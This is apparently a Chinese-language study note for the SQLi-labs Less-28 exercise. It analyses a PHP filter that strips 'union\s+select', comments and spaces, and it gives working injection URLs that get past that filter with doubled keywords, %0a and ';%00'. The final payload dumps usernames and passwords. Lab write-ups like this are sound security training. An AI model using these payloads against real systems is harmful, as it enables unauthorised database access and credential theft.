# Less-28 （union\s+select 词组过滤）

## 查看分析源码
```php
$id= preg_replace('/[\/\*]/',"", $id);              // strip /*
$id= preg_replace('/[--]/',"", $id);                 // --
$id= preg_replace('/[#]/',"", $id);                  // #
$id= preg_replace('/[ +]/',"", $id);                 // 空格和+（两次）
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/union\s+select/i',"", $id);     // ★ 只拦 union<空白>select
```

和 Less-27 三处不同：过滤的是 `union\s+select` 词组而不是单独的 union/select；加了 `/i`；括号闭合 `('$id')`。没报错。

空格 `[ +]` 只拦空格和加号 → `%0a` 能用。注释全禁 → `;%00` 截断。

## 绕过 union\s+select

不是插 all，是**双写**：

```
union seunion selectlect
  ↑______↑ 这一块是 union se… 不匹配 union\s+select

union seunion selectlect
        ^^^^^^^^^^^^^^^ 这一块：union<换行>select → 匹配！被删
```

删完后：`se` + `lect` = `select`。前面还有一个 `union` 留着。

所以 `union %0ase union %0aselect lect` → 过滤后 → `union select`

## order by

```
?id=1')%0aorder%0aby%0a3;%00
?id=1')%0aorder%0aby%0a4;%00
```

## 回显位

```
?id=0')%0aunion%0aseunion%0aselectlect%0a1,2,3;%00
```
![](99_Attachments/图片/Less-28/file-20260615202037192.png)
## 爆数据

```
?id=0')%0aunion%0aseunion%0aselectlect%0a1,group_concat(username,':',password),3%0afrom%0ausers;%00
```
![](99_Attachments/图片/Less-28/file-20260615202054267.png)

总结：`union\s+select` 词组过滤看到 `union 换行 select` 就删，那就多给一份让它删——`union seunion selectlect` 删完后正好剩 `union select`。
